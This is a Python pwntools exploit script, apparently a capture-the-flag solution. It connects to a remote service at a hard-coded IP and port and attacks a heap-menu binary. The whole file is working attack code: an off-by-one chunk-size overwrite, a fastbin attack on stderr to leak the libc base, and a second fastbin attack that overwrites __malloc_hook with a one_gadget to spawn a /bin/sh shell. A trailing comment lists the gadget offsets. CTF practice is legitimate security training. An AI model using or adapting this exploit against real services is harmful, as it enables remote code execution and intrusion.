#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "pwn"
libFile  = "./libc.so.6"
#libFile  = "/lib/x86_64-linux-gnu/libc.so.6"

remoteIp = "39.97.119.22"
remotePort = 10003

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, data):
	sla('^_^:\n', str(1))
	sla('?_?', str(size))
	sa(':>', data)

def rm(idx):
	sla('^_^:\n', str(2))
	sla('~_~', str(idx))

#--------------------------Exploit--------------------------
def exploit():

	ad(0x68,  'A') #idx 0
	ad(0x68,  'B') #idx 1
	ad(0x68,  'C') #idx 2
	ad(0x68,  'D') #idx 3

	rm(0)
	p = 'A' * 0x60
	p += p64(0x0)
	p += '\xe1'
	ad(0x68, p) #idx 0
	rm(1)
	rm(2) # chunk for fastbin attack
	ad(0x28, 'A' * 0x28) #idx 1

	p = 'B' * 0x30
	p += p64(0)
	p += p64(0x71)
	p += '\xdd\x25'
	ad(0x38, p) #idx 2

	ad(0x68, 'A') #idx 4 for ajust fastbin 

	#p = 'A' * 0xA

	p = '\x00' * 0x33
	p += p64(0x00000000fbad1800) #flag
	p += p64(0) * 3
	p += p8(0)
	ad(0x68, p) #idx 5
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - lib.sym['_IO_2_1_stderr_'] - 192

	li('lib_base ' + hex(lib.address))

	# fastbin attack to malloc_hook -0x23
	rm(4)
	rm(2)

	p = 'B' * 0x30
	p += p64(0)
	p += p64(0x71)
	p += p64(lib.sym['__malloc_hook'] - 0x23)
	ad(0x38, p)
	ad(0x68, 'A')

	# modify malloc_hook as one_gadget
	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = lib.address + gadget[2]
	p = '\x11' * (0x13 - 8)
	p += p64(one_gadget)
	p += p64(lib.sym['realloc'] + 20)
	ad(0x68, p)

	# get shell
	sl('1')
	sl('10')


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	for i in range(16):
		try:
			if LOCAL:
				exe = ELF(exeFile)
				if LIB:
					lib = ELF(libFile)
					io = exe.process(env = {"LD_PRELOAD" : libFile})
				else:
					io = exe.process()
			
			else:
				exe = ELF(exeFile)
				io = remote(remoteIp, remotePort)
				if LIB:
					lib = ELF(libFile)
			exploit()
			finish()
		except:
			c()
		
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
'''
